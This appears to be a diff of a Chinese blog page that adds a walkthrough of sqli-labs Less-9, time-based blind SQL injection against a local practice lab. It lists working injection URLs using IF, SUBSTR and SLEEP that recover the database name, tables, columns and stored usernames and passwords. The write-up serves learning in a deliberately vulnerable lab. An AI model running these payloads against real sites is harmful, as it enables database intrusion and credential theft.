@@ -4,8 +4,10 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="contact, Junk Blog">
-    <meta name="description" content="contact | Junk Blog">
+    <meta name="keywords" content="sqli-labs-Less9, Junk Blog">
+    <meta name="description" content="前言这一关测试的是时间盲注，payload 语句结构和布尔盲注相似。
+基础知识IF(expr1,expr2,expr3)：如果 expr1 的值为 true，则返回 expr2 的值，如果 expr1 的值为 false
+sleep(n)：">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +15,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>contact | Junk Blog</title>
+    <title>sqli-labs-Less9 | Junk Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -282,13 +284,13 @@
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('https://i.loli.net/2019/10/16/NDibuKXPzyrAIGj.png')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        contact
+                        sqli-labs-Less9
                     </div>
                 </div>
             </div>
@@ -378,12 +380,29 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/sqli-labs/" target="_blank">
+                                <span class="chip bg-color">sqli-labs</span>
+                            </a>
+                        
+                            <a href="/tags/SQL-Injection/" target="_blank">
+                                <span class="chip bg-color">SQL Injection</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Web-security/" class="post-category" target="_blank">
+                                Web security
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -391,21 +410,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-10-07
+                    2019-10-15
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        52
+                        520
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        1 分
+                        2 分
                     </div>
                     
                 
@@ -421,7 +440,46 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <script>
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关测试的是时间盲注，payload 语句结构和布尔盲注相似。</p>
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>IF(expr1,expr2,expr3)：如果 expr1 的值为 true，则返回 expr2 的值，如果 expr1 的值为 false</p>
+<p>sleep(n)：命令延时 n 秒后执行</p>
+<h1 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h1><ol>
+<li><p>用 if()+ascii()+substr() 函数来分析输出内容</p>
+</li>
+<li><p>用 sleep() 函数判断输出的内容是否正确。</p>
+</li>
+</ol>
+<h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><h2 id="基于时间的GET单引号盲注"><a href="#基于时间的GET单引号盲注" class="headerlink" title="基于时间的GET单引号盲注"></a>基于时间的GET单引号盲注</h2><ol>
+<li><strong>输入字符使网页报错,判断执行的 SQL 语句</strong></li>
+</ol>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1'</code></pre><p><img src="https://i.loli.net/2019/10/16/JcXFtHx2eAzWS45.png" alt="less9-1.png"></p>
+<p>注：网页是正常界面，使用时间盲注进行测试</p>
+<ol start="2">
+<li><strong>判断数据库字符串的长度</strong></li>
+</ol>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(length(database()))&gt;56, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/5pRUJo36x1wNarc.png" alt="less9-2.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(length(database()))=56, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/FZIXTMNaoPAYJj6.png" alt="less9-3.png"></p>
+<ol start="3">
+<li><strong>判断数据库</strong></li>
+</ol>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/3GwjcbBpYnvPZH5.png" alt="less9-4.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/eonK3brJVg4LaXY.png" alt="less9-5.png"></p>
+<ol start="4">
+<li><strong>判断表</strong></li>
+</ol>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))&gt;101, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/8jGMV7ZxhvKIFpz.png" alt="less9-6.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/9tTmR73w46gBbe2.png" alt="less9-7.png"></p>
+<ol start="5">
+<li><strong>判断字段</strong></li>
+</ol>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),1,1))=68, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/4m5lzPZ81nhMNDB.png" alt="less9-8.png"></p>
+<ol start="6">
+<li><strong>判断数据</strong></li>
+</ol>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select username FROM security.users limit 0,1),1,1))=68, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/DVzIYSaxdcOqB7p.png" alt="less9-9.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select password FROM security.users limit 0,1),1,1))=68, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/6bsNqC2iOByda4k.png" alt="less9-10.png"></p>
+<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.cnblogs.com/omnis/p/8318743.html" target="_blank" rel="noopener">【sqli-labs】 less9 GET - Blind - Time based. - Single Quotes (基于时间的GET单引号盲注)</a></p>
+<script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -462,7 +520,7 @@
                     </span>
                     <a href="https://github.com/hhkk2334/hhkk2334.github.io" class="b-link-green">Junk Blog</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/contact/index.html" class="b-link-green">contact</a>
+                    <a href="/2019/10/15/sqli-labs-Less9/" class="b-link-green">sqli-labs-Less9</a>
                 </p>
             </div>
         </div>
@@ -481,7 +539,7 @@
 <script src="/libs/gitment/gitment.js"></script>
 <script>
 var gitment = new Gitment({
-    id: 'Mon Oct 07 2019 21:21:36 GMT+0800',
+    id: 'Tue Oct 15 2019 23:25:41 GMT+0800',
     owner: '315053891',
     repo: 'hhkk2334.github.io',
     oauth: {
@@ -510,33 +568,47 @@ gitment.render('gitment-content');
                 <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/contact/index.html">
+                <a href="/2019/10/15/sqli-labs-Less9/">
                     <div class="card-image">
                         
+                        <img src="https://i.loli.net/2019/10/16/NDibuKXPzyrAIGj.png" class="responsive-img" alt="sqli-labs-Less9">
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="contact">
-                        
-                        <span class="card-title">contact</span>
+                        <span class="card-title">sqli-labs-Less9</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return</div>
+                    <div class="summary">前言这一关测试的是时间盲注，payload 语句结构和布尔盲注相似。
+基础知识IF(expr1,expr2,expr3)：如果 expr1 的值为 true，则返回 expr2 的值，如果 expr1 的值为 false
+sleep(n)：</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-07
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-15
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fa fa-user fa-fw"></i>
-                            Trash Can,Trash Can
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Web-security/" class="post-category" target="_blank">
+                                    Web security
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
 
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/sqli-labs/" target="_blank">
+                        <span class="chip bg-color">sqli-labs</span>
+                    </a>
+                    
+                    <a href="/tags/SQL-Injection/" target="_blank">
+                        <span class="chip bg-color">SQL Injection</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
@@ -544,36 +616,47 @@ gitment.render('gitment-content');
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="fa fa-dot-circle-o"></i>
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/contact/index.html">
+                <a href="/2019/10/14/netscaler-升级/">
                     <div class="card-image">
                         
+                        <img src="https://i.loli.net/2019/10/15/KCTYrULxcDp8bwA.jpg" class="responsive-img" alt="netscaler 升级">
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="contact">
-                        
-                        <span class="card-title">contact</span>
+                        <span class="card-title">netscaler 升级</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return</div>
+                    <div class="summary">环境netscaler版本： 11.1（具体版本忘了）
+平台型号：NSMPX-5550
+客户需求：把 netscaler 升级到最新的 13.0 版本。
+升级前准备：保证 PC 机能够 ssh 到 netscaler 上。
+注： netsc</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-07
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-14
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fa fa-user fa-fw"></i>
-                            Trash Can,Trash Can
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Citrix/" class="post-category" target="_blank">
+                                    Citrix
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
-
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Netscaler-ADC/" target="_blank">
+                        <span class="chip bg-color">Netscaler(ADC)</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
